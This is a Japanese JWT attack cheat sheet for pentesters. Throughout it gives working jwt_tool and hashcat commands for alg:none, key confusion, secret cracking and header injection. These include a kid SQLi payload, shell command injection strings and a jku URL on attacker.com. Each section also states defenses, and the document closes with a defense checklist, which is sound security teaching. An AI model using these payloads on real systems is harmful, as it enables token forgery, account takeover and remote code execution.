## JWTチートシート・リファレンス

本節は、JWT（JSON Web Token）に対する代表的な攻撃手法を、実務で即座に参照できる形にまとめたチートシートである。前節までで扱った個々の脆弱性クラス（alg混同、鍵漏洩、ヘッダインジェクションなど）の要点を横断的に整理し、ペネトレーションテストや脆弱性診断の現場で使う具体的なコマンド・ペイロード・判定基準を提供する。読者はJWTの基本構造（`header.payload.signature` の3パートをBase64urlエンコードしたもの）と署名検証の原理はすでに理解している前提で進める。

### JWTの構造とヘッダパラメータが攻撃面になる理由

JWTの`header`には、署名検証に使う鍵をどう特定・取得するかを指示するパラメータが複数存在する。これらは本来「検証者が鍵を見つけるためのヒント」だが、攻撃者がJWTの中身（ヘッダ含む）を自由に書き換えられる以上、**検証ロジックが「ヘッダの指示に従って鍵を探しに行く」設計になっていると、攻撃者は自分の用意した鍵を検証させることができる**。これがJWT攻撃全般の根本原理である。

代表的なヘッダパラメータ:

| パラメータ | 意味 | 悪用の要点 |
|---|---|---|
| `alg` | 署名アルゴリズム | `none`への変更、非対称→対称の混同 |
| `kid` | Key ID（鍵を検索するための識別子） | パストラバーサル、SQLi、コマンドインジェクション |
| `jku` | JWK Set URL（鍵集合を取得するURL） | 攻撃者ホストへのリダイレクト（SSRF的性質） |
| `jwk` | 鍵そのものをヘッダに埋め込む | 攻撃者が生成した公開鍵をそのまま埋め込み検証させる |
| `x5u` / `x5c` | X.509証明書のURL／埋め込み証明書 | 自己署名証明書のなりすまし |

> 出典: PayloadsAllTheThings: JSON Web Token — https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/JSON%20Web%20Token/README.md
> 出典: HackTricks: JWT Vulnerabilities — https://book.hacktricks.xyz/pentesting-web/hacking-jwt-json-web-tokens

---

### 1. `alg: none` 攻撃（CVE-2015-9235）

JWT仕様（RFC 7519 / JWS）は署名なしトークンを表現する `"alg": "none"` を許容している。実装が「`alg`ヘッダの値をそのまま信用して検証方式を切り替える」設計だと、攻撃者はヘッダを書き換えるだけで署名検証を完全にスキップさせられる。

**なぜ通るのか**: 多くのJWTライブラリは「ヘッダに書かれたアルゴリズムで検証する」実装になっており、サーバー側が期待するアルゴリズムをホワイトリストで固定していない場合、攻撃者の指定した`none`がそのまま使われてしまう。大文字小文字を変えた `None` / `NONE` / `nOnE` などのバリアントで大文字小文字を区別しない実装のバイパスを試すのも定石である。

```python
import jwt
decodedToken = jwt.decode(jwtToken, verify=False)
noneEncoded = jwt.encode(decodedToken, key='', algorithm=None)
print(noneEncoded.decode())
```

jwt_tool（ticarpi/jwt_tool）を使う場合:

```bash
python3 jwt_tool.py [JWT_HERE] -X a
```

**防御**: 検証ロジックでアルゴリズムをサーバー側の固定値（ホワイトリスト）に限定し、ヘッダの`alg`値を検証方式の選択に使わない。ほとんどのモダンなJWTライブラリ（PyJWT、jjwt等）は近年のバージョンで`none`をデフォルト拒否するが、古いバージョンや自前実装では依然としてリスクがある。

> 出典: PayloadsAllTheThings: JSON Web Token — https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/JSON%20Web%20Token/README.md

---

### 2. アルゴリズム混同攻撃 RS256→HS256（CVE-2016-5431 / CVE-2016-10555）

RS256（RSA非対称署名）を使うサーバーが、HS256（HMAC対称署名）を使ったトークンを受け取った際に、**RSAの公開鍵をそのままHMACの共有秘密鍵として使って検証してしまう**実装バグ。公開鍵は名前の通り公開情報のため、攻撃者はこれを入手すればHMAC署名を自分で計算でき、任意のペイロードを持つ「正当な」署名付きトークンを偽造できる。

**なぜ起こるのか（仕組みレベル）**: 多くのJWT検証ライブラリのAPIは「鍵（key）」という1つの引数しか取らず、その鍵をRS256の公開鍵として使うかHS256の共有鍵として使うかを、**トークン側が指定した`alg`ヘッダに従って決める**実装になっていることがある。つまり「鍵の種類（公開鍵か秘密鍵か）」と「アルゴリズムの種類（非対称か対称か）」を紐付けずに、ヘッダの自己申告を信用してしまう設計ミスが原因である。攻撃者が`alg`を`HS256`に書き換え、公開鍵を使ってHMAC署名すれば、サーバーは「同じ公開鍵文字列」をHMACの鍵として使って検証するため署名が一致してしまう。

**手順**:

1. サーバーの公開鍵を取得する（TLS証明書から抽出できる場合が多い）:

```bash
openssl s_client -connect example.com:443 2>&1 < /dev/null | sed -n '/-----BEGIN/,/-----END/p' > certificatechain.pem
openssl x509 -pubkey -in certificatechain.pem -noout > pubkey.pem
```

2. PEMをHMAC鍵として使うためhex化する:

```bash
cat pubkey.pem | xxd -p | tr -d "\n"
```

3. `alg`を`HS256`に変更したヘッダとペイロードでHMAC-SHA256署名を計算する:

```bash
echo -n "[HEADER].[PAYLOAD]" | openssl dgst -sha256 -mac HMAC -macopt hexkey:[HEX_KEY]
```

4. 署名をhexからBase64urlに変換し、`header.payload.signature`として結合する:

```python
python2 -c "import base64, binascii; print base64.urlsafe_b64encode(binascii.a2b_hex('[HEX_SIG]')).replace('=','')"
```

jwt_toolでの自動化:

```bash
python3 jwt_tool.py JWT_HERE -X k -pk my_public.pem
```

Burp Suiteを使う場合は「JWT Editor」拡張の「HMAC Key Confusion Attack」機能で、公開鍵PEMを与えるだけで同等の攻撃を自動生成できる。

**防御**: 検証時に「このトークンはRS256で検証されるべきもの」というアプリケーション側の期待値を固定し、トークンヘッダの`alg`値によって検証アルゴリズムを切り替えない。ライブラリのAPIとして「鍵と許可アルゴリズムのペア」を明示的に渡せるものを使う（例: PyJWTの`algorithms=["RS256"]`引数を必ず指定する）。

> 出典: PayloadsAllTheThings: JSON Web Token — https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/JSON%20Web%20Token/README.md
> 出典: HackTricks: JWT Vulnerabilities — https://book.hacktricks.xyz/pentesting-web/hacking-jwt-json-web-tokens

---

### 3. 署名検証バイパスのバリエーション

#### 3.1 Null署名攻撃（CVE-2020-28042）

HS256ヘッダを維持したまま、署名部分を完全に空にして送信する:

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.
```

一部の実装は「署名が空文字列の場合に検証関数が例外を投げず、誤って真を返す」実装バグを持つ。jwt_toolでは:

```bash
python3 jwt_tool.py JWT_HERE -X n
```

#### 3.2 署名バイト反転による検証ロジック確認

署名部分の1バイトだけを変更して送信し、サーバーがリクエストを受理するかどうかを見る。受理された場合、そもそも署名検証が実装されていない（または無効化されている）ことが分かる。これは攻撃そのものというより、他の攻撃を試す前の「検証有無の切り分け」に使う手法である。

#### 3.3 署名漏洩によるエラーメッセージ（CVE-2019-7644）

不正な署名を送信した際、エラーレスポンスに「期待される署名値」がそのまま含まれてしまう実装が存在する:

```
Invalid signature. Expected SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c got [ATTACKER_SIG]
```

これは典型的な「詳細すぎるエラーメッセージによる情報漏洩」で、攻撃者は正しい署名をそのまま使い回せる。

#### 3.4 RS256公開鍵の復元

RS256/RS384/RS512はPKCS#1 v1.5パディングを使うため、**同じ鍵ペアで署名された異なる2つのメッセージと署名のペアがあれば、公開鍵を数学的に復元できる**場合がある。SecuraBVのjws2pubkeyツールが実装を提供している:

```bash
docker run -it ttervoort/jws2pubkey JWS1 JWS2
```

公開鍵が非公開のシステムで、複数のトークンを傍受できた場合に有効な攻撃手法である。

> 出典: PayloadsAllTheThings: JSON Web Token — https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/JSON%20Web%20Token/README.md

---

### 4. 弱い共有鍵のブルートフォース（HS256）

HS256はHMAC-SHA256を使う対称鍵方式であり、鍵の強度がそのままセキュリティ強度になる。開発時のデフォルト値（`secret`、`your_jwt_secret`、`change_this_super_secret_random_string`等）がそのまま本番に残っているケースは頻出する。

**jwt_toolによる辞書攻撃**:

```bash
python3 -m pip install termcolor cprint pycryptodomex requests
python3 jwt_tool.py [JWT] -d /tmp/wordlist -C
```

**hashcat**（モードは`16500`＝JWT-HS256）:

```bash
# 辞書攻撃
hashcat -a 0 -m 16500 jwt.txt wordlist.txt

# ルールベース（変形パターンを加える）
hashcat -a 0 -m 16500 jwt.txt passlist.txt -r rules/best64.rule

# 総当たり（文字種・桁数を指定）
hashcat -a 3 -m 16500 jwt.txt ?u?l?l?l?l?l?l?l -i --increment-min=6
```

wallarm/jwt-secretsは3,502件の頻出JWT秘密鍵を集めた専用ワードリストであり、hashcat/jwt_toolの`-d`オプションにそのまま投入できる。C実装の`c-jwt-cracker`（brendan-rius）はCPU/GPUベースで高速に総当たりを行える。

**鍵発見後の再署名**: jwt_toolの対話メニューから「Sign token with known key」を選び、発見した秘密鍵とアルゴリズム（HS256/384/512）を指定すれば、任意のペイロードを持つ正当な署名付きトークンを生成できる。これは単に鍵を割ることがゴールではなく、**鍵を割った後に任意の権限を持つトークンを偽造できる**点が実害である。

**漏洩情報からの鍵再構築**: 設定ファイルやDBレコードが別経路で漏洩している場合、それらから署名鍵を導出できるケースもある。たとえば暗号化キーの一部をハッシュ化して流用しているような実装では:

```python
jwt_secret = sha256(encryption_key[::2]).hexdigest()
jwt_hash = b64encode(sha256(f"{email}:{password_hash}")).decode()[:10]
token = jwt.encode({"id": user_id, "hash": jwt_hash}, jwt_secret, "HS256")
```

このように、他の脆弱性（設定漏洩、SQLi等）とJWT解析を組み合わせることで鍵を再構築できる場合がある点に注意する。

**防御**: HMAC鍵は最低256ビット相当のランダムなエントロピーを持つ値を使用し、環境変数やシークレットマネージャで安全に管理する。可能であれば非対称アルゴリズム（RS256/ES256）へ移行し、署名鍵と検証鍵を分離する。

> 出典: PayloadsAllTheThings: JSON Web Token — https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/JSON%20Web%20Token/README.md
> 出典: HackTricks: JWT Vulnerabilities — https://book.hacktricks.xyz/pentesting-web/hacking-jwt-json-web-tokens

---

### 5. `kid`（Key ID）ヘッダの悪用

`kid`はサーバーが複数の鍵の中からどれを使うかを識別するための識別子で、多くの実装は「`kid`の値をファイルパスやDBクエリのキーとしてそのまま使う」。ここに**入力値検証なしの外部入力（`kid`）→ ファイル読み込み/DB検索という危険な処理（sink）**が生まれ、パストラバーサル・SQLi・コマンドインジェクションの温床になる。

#### 5.1 ローカルファイルパス注入

`kid`にファイルパスを指定し、サーバーがそのパスの内容を鍵として読み込んでしまう実装を狙う:

```json
{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "/root/res/keys/secret.key"
}
```

攻撃者が中身を予測できるファイル（例: `/dev/null`は常に空、既知のログファイルや静的CSS/JSファイルなど内容が既知のもの）を指すことで、その内容をHMAC鍵として使って署名を偽造できる。

```bash
python3 jwt_tool.py <JWT> -I -hc kid -hv "../../dev/null" -S hs256 -p ""
python3 jwt_tool.py <JWT> -I -hc kid -hv "/proc/sys/kernel/randomize_va_space" -S hs256 -p "2"
```

`-p`には「そのファイルの既知の中身」を鍵として指定する。`/proc/sys/kernel/randomize_va_space`はLinux上でほぼ確実に`0`/`1`/`2`のいずれかであり、既知の内容を持つファイルとして悪用されることがある例として挙げられている。

**なぜ有効か**: HS256の署名検証は「鍵の中身のバイト列」さえ一致すれば成立する。`kid`で指定したファイルパスの読み込み結果がそのまま鍵になる実装であれば、攻撃者はファイルの中身さえ分かれば（あるいは空にできれば）、その鍵で有効な署名を計算できてしまう。

#### 5.2 SQLインジェクション

`kid`の値がDBクエリに直接連結される実装では、SQLiによって「攻撃者が指定した任意の文字列」を鍵として返させることができる:

```
non-existent-index' UNION SELECT 'ATTACKER';-- -
```

このペイロードにより、DBは`kid`検索がヒットしなかった場合でも`UNION SELECT`で強制的に`ATTACKER`という文字列を返す。攻撃者はこの既知の文字列（`ATTACKER`）をHMAC鍵として使い、署名を計算すればよい。

```bash
python3 jwt_tool.py -t https://target.com -rc "jwt=[JWT]" -I -hc kid -hv custom_sqli_vectors.txt
```

#### 5.3 OSコマンドインジェクション

`kid`の値がシェルコマンドの引数として渡される実装（例: `openssl`コマンドの鍵ファイル引数など）では、コマンドインジェクションによってRCE（リモートコード実行）に直結する:

```
key.crt; whoami && python -m SimpleHTTPServer 1337 &
```

または

```
/root/res/keys/secret7.key; cd /root/res/keys/ && python -m SimpleHTTPServer 1337&
```

これは「署名偽造」の域を超え、サーバー上でのコマンド実行につながる重大な脆弱性であり、`kid`パラメータを外部コマンドの入力に使う実装は特に注意が必要である。

**防御**: `kid`の値は事前定義されたホワイトリスト（許可された鍵IDの集合）と照合し、それ以外は拒否する。ファイルパスやSQLクエリ、シェルコマンドの構築に`kid`の値を直接連結しない。

> 出典: PayloadsAllTheThings: JSON Web Token — https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/JSON%20Web%20Token/README.md
> 出典: HackTricks: JWT Vulnerabilities — https://book.hacktricks.xyz/pentesting-web/hacking-jwt-json-web-tokens
> 出典: HowToHunt: JWT — https://kathan19.gitbook.io/howtohunt/jwt-attack/jwt

---

### 6. `jwk` ヘッダインジェクション（埋め込み公開鍵、CVE-2018-0114）

JWSヘッダには、検証用の鍵そのものをJSON形式で埋め込める`jwk`パラメータが存在する。実装が「ヘッダに`jwk`があれば、それを検証鍵として無条件に使う」設計だと、**攻撃者は自分で生成した鍵ペアの公開鍵をヘッダに埋め込み、対応する秘密鍵で署名するだけで「正当な」トークンを作れてしまう**。署名検証自体は正しく行われるが、そもそも「どの鍵を信用するか」という信頼の起点が攻撃者に明け渡されている点が本質的な欠陥である。

```json
{
  "alg": "RS256",
  "typ": "JWT",
  "jwk": {
    "kty": "RSA",
    "kid": "jwt_tool",
    "use": "sig",
    "e": "AQAB",
    "n": "[PUBLIC_KEY_COMPONENTS]"
  }
}
```

jwt_toolでの自動化:

```bash
python3 jwt_tool.py [JWT_HERE] -X i
```

Burp Suite「JWT Editor」拡張での手順:
1. 新しいRSA鍵を生成する
2. Repeaterでリクエスト中のJWTを編集する
3. 「Attack」メニューから「Embedded JWK」を選択する（拡張が自動的にヘッダへの鍵埋め込みと再署名を行う）

**防御**: 検証ロジックはサーバー側で管理する鍵ストアのみを信頼し、トークン自身が持ち込む鍵情報（`jwk`）を検証に使わない。

> 出典: PayloadsAllTheThings: JSON Web Token — https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/JSON%20Web%20Token/README.md
> 出典: HackTricks: JWT Vulnerabilities — https://book.hacktricks.xyz/pentesting-web/hacking-jwt-json-web-tokens

---

### 7. `jku`（JWK Set URL）ヘッダインジェクション

`jku`は「この鍵集合（JWKS: JSON Web Key Set）をこのURLから取得せよ」とサーバーに指示するパラメータである。検証者がこのURLへ実際にHTTPリクエストを送って鍵を取得する実装の場合、**`jku`を攻撃者が制御するURLに書き換えることで、サーバーに攻撃者のJWKSを取得・信用させられる**。これは実質的にSSRF（Server-Side Request Forgery、サーバーに攻撃者指定先へのリクエストを強制させる脆弱性）と同じ構造を持つ。

典型的なJWKSエンドポイントのパス例（探索時の参考）:
- `/jwks.json`
- `/.well-known/jwks.json`
- `/openid/connect/jwks.json`
- `/api/keys`
- `/{tenant}/oauth2/v1/certs`

**攻撃手順**:

1. RSA鍵ペアを生成する:

```bash
openssl genrsa -out keypair.pem 2048
openssl rsa -in keypair.pem -pubout -out publickey.crt
```

2. 公開鍵から`n`（modulus）・`e`（exponent）パラメータを抽出し、以下のようなJWKS JSONを構築して攻撃者が管理するサーバーにホストする:

```json
{
  "keys": [
    {
      "kid": "attacker-key-id",
      "kty": "RSA",
      "e": "AQAB",
      "n": "[ATTACKER_PUBLIC_KEY_N]"
    }
  ]
}
```

3. トークンヘッダの`jku`を攻撃者のJWKS URLに書き換え、`kid`をJWKS内の鍵IDと一致させる。

4. 秘密鍵でペイロードに署名する。

jwt_toolでの自動化:

```bash
python3 jwt_tool.py JWT_HERE -X s
python3 jwt_tool.py JWT_HERE -X s -ju http://attacker.com/jwks.json
```

Burp「JWT Editor」拡張の手順:
1. 新しいRSA鍵を生成
2. 自分でJWKSエンドポイントをホスト
3. JWTペイロードを編集
4. `kid`をホストしたJWKS内の値に置き換え
5. `jku`ヘッダを追加し（「modify header」のチェックを外した状態で）署名

**攻撃検知のコツ**: 診断時はBurp Collaboratorなど、外部からのHTTPコールバックを検知できるサービスのURLを一時的に`jku`へ入れて送信し、サーバーからのアクセスが実際に発生するかを確認すると、リモート鍵取得が実装されているかどうかを安全に切り分けられる。

**防御**: `jku`から取得する鍵集合のホストをホワイトリストで固定し、外部URLからの動的な鍵取得を許可しない。可能であれば`jku`自体を無効化し、鍵はサーバー側の静的な設定として管理する。

> 出典: PayloadsAllTheThings: JSON Web Token — https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/JSON%20Web%20Token/README.md
> 出典: HackTricks: JWT Vulnerabilities — https://book.hacktricks.xyz/pentesting-web/hacking-jwt-json-web-tokens
> 出典: HowToHunt: JWT — https://kathan19.gitbook.io/howtohunt/jwt-attack/jwt

---

### 8. `x5u` / `x5c` 証明書パラメータの悪用

`x5u`は`jku`のX.509証明書版で、「検証に使う証明書をこのURLから取得せよ」と指示する。`x5c`はその証明書自体をBase64エンコードしてヘッダに直接埋め込む方式である。原理は`jku`/`jwk`とまったく同じで、**検証者が信頼の起点（鍵・証明書）を外部入力から取得してしまう**ことが問題の核心である。

**x5u攻撃（URLベース）**:

```bash
openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout attacker.key -out attacker.crt
```

生成した自己署名証明書を`http://attacker.com/attacker.crt`のようなURLでホストし、トークンの`x5u`ヘッダをそのURLに書き換える。サーバーが自己署名証明書を無条件に信頼して取得・検証してしまう実装であれば攻撃が成立する。

**x5c攻撃（埋め込みベース）**:

証明書内容（`-----BEGIN CERTIFICATE-----`等のマーカーを除いた部分）をBase64配列としてヘッダに直接埋め込む:

```json
{
  "alg": "RS256",
  "x5c": ["[BASE64_ENCODED_CERTIFICATE]"]
}
```

modulus（`n`）・exponent（`e`）パラメータの変換例:

```bash
echo "MODULE_VALUE" | base64 | tr '\n' ' ' | sed 's/ //g'
```

**防御**: `x5u`から取得する証明書のCA（認証局）チェーンを信頼済みルート証明書まで検証し、自己署名証明書を無条件に受理しない。`x5c`で埋め込まれた証明書についても同様にチェーン検証を行う。

> 出典: PayloadsAllTheThings: JSON Web Token — https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/JSON%20Web%20Token/README.md
> 出典: HowToHunt: JWT — https://kathan19.gitbook.io/howtohunt/jwt-attack/jwt

---

### 9. ペイロードクレームの改ざん

署名検証自体をバイパスできなくても、有効な鍵を入手済み（あるいは検証がそもそも甘い）場合、ペイロード中のクレームを書き換えるだけで権限昇格や認証バイパスが可能になることがある。

| クレーム | 悪用パターン |
|---|---|
| `exp`（有効期限） | 極端に未来の値に書き換えて無期限化。仕様上は秒単位のUnixタイムスタンプである点に注意（ミリ秒と誤解した実装は誤動作しやすい） |
| `nbf`（Not Before） | `0`など過去の値にして即時有効化 |
| `jti`（JWT ID） | 失効リスト・リプレイ対策の一意識別子を書き換えてブロックリストを回避 |
| `iss`/`aud`（発行者／対象者） | 別サービス向けに発行されたトークンを別サービスへ転用（クロスサービスのトークン使い回し） |

```bash
python3 jwt_tool.py JWT_HERE -I -pc exp -pv 9999999999
python3 jwt_tool.py JWT_HERE -I -pc nbf -pv 0
```

`-pc`（payload claim）で対象クレーム、`-pv`（payload value）で新しい値を指定する。

実務上のコツとして、UUID等の推測不能なパラメータを操作しようとして行き詰まった場合、**そのパラメータを空文字列にしてみる**ことで検証ロジックの想定外の分岐（デフォルト値やnullチェック漏れ）を突けることがある。

**防御**: `exp`/`nbf`の妥当性をサーバー時刻と照合して厳密に検証し、`iss`/`aud`をアプリケーションごとに固定値でチェックする。重要な操作を伴うトークンには`jti`を発行し、使用済みトークンをサーバー側で追跡・失効できる仕組み（denylist/allowlist）を用意する。

> 出典: PayloadsAllTheThings: JSON Web Token — https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/JSON%20Web%20Token/README.md
> 出典: HowToHunt: JWT — https://kathan19.gitbook.io/howtohunt/jwt-attack/jwt

---

### 10. 診断ワークフローの実践手順

3資料に共通する、実際の診断で使える手順をまとめる。

1. **トークンの発見**: リクエスト/レスポンス中からJWTらしき文字列を正規表現で検出する: `[= ]eyJ[A-Za-z0-9_-]*\.[A-Za-z0-9._-]*`
2. **スコープの確認**: 認可に使われているトークンかどうかを、ヘッダ/Cookieを1つずつ外して挙動を見ることで切り分ける。
3. **デコードと棚卸し**: `alg`、`exp`、権限に関わるクレーム（`role`、`id`など）を確認する。
4. **署名検証の有無テスト**: 署名の1バイトを変更して送信し、受理されれば検証未実装が疑われる。
5. **系統的な攻撃試行**: アルゴリズム混同 → 弱鍵ブルートフォース → ヘッダインジェクション（`kid`/`jku`/`jwk`/`x5u`）の順に試す。
6. **影響評価**: 成功した攻撃を、権限昇格やデータアクセスにどう連鎖させられるかを検証し、文書化する。

**自動化ツール（総合）**:

```bash
# jwt_tool 包括的スキャンモード（テスト対象URLに対して自動診断）
python3 jwt_tool.py -M at -t "https://api.example.com/api/v1/user/ID" \
  -rh "Authorization: Bearer <TOKEN>"
```

このモードは複数の既知攻撃パターンを自動で試行し、成功したものを緑色で表示する。

**参考ツール一覧**:

| ツール | 用途 |
|---|---|
| jwt_tool（ticarpi/jwt_tool） | デコード・改ざん・鍵クラック・自動攻撃の総合ツール |
| Burp JWT Editor拡張 | Burp Suite上での鍵生成・再署名・組み込み攻撃 |
| hashcat（モード`16500`） | GPU利用によるHS256秘密鍵の高速クラック |
| c-jwt-cracker / jwt-hack / jwtbrute | CLIベースの辞書・総当たりクラッカー |
| jws2pubkey（SecuraBV） | 複数署名からのRS256公開鍵復元 |
| jwt.io | オンラインでのエンコード・デコード確認 |

> 出典: PayloadsAllTheThings: JSON Web Token — https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/JSON%20Web%20Token/README.md
> 出典: HackTricks: JWT Vulnerabilities — https://book.hacktricks.xyz/pentesting-web/hacking-jwt-json-web-tokens
> 出典: HowToHunt: JWT — https://kathan19.gitbook.io/howtohunt/jwt-attack/jwt

---

### 11. 防御のまとめ（チェックリスト）

本節で紹介したすべての攻撃に共通する防御原則を、実装チェックリストとして整理する。防御目的での参照を前提とし、実サービスへの無許可の検証は行わないこと。

- [ ] **アルゴリズムをサーバー側で固定**し、トークンヘッダの`alg`値によって検証方式を切り替えない（`none`を明示的に拒否し、RS256運用時はHS256を許可しない）
- [ ] **署名鍵は十分なエントロピー**（HMACなら最低256ビット相当）を持つランダム値とし、デフォルト値・推測可能な値を使わない
- [ ] **`kid`はホワイトリスト照合**で扱い、ファイルパス・SQLクエリ・シェルコマンドへ直接連結しない
- [ ] **`jku`/`x5u`は動的取得を無効化**するか、許可ホストのホワイトリストで厳格に制限する
- [ ] **`jwk`（埋め込み鍵）をヘッダから検証に使わない**。検証鍵は常にサーバー側の鍵ストアを参照する
- [ ] **`x5c`の証明書チェーンを信頼済みルートまで検証**し、自己署名証明書を無条件に信用しない
- [ ] **`exp`/`nbf`/`iss`/`aud`を厳密に検証**し、`jti`によるトークン失効・リプレイ対策を実装する
- [ ] **エラーメッセージに署名値や内部情報を含めない**（署名比較の失敗時に「期待値」を返さない）
- [ ] **署名検証失敗をログに記録**し、異常なアルゴリズム変更やヘッダ改ざんの試行を監視する

> 出典: PayloadsAllTheThings: JSON Web Token — https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/JSON%20Web%20Token/README.md
> 出典: HackTricks: JWT Vulnerabilities — https://book.hacktricks.xyz/pentesting-web/hacking-jwt-json-web-tokens
> 出典: HowToHunt: JWT — https://kathan19.gitbook.io/howtohunt/jwt-attack/jwt
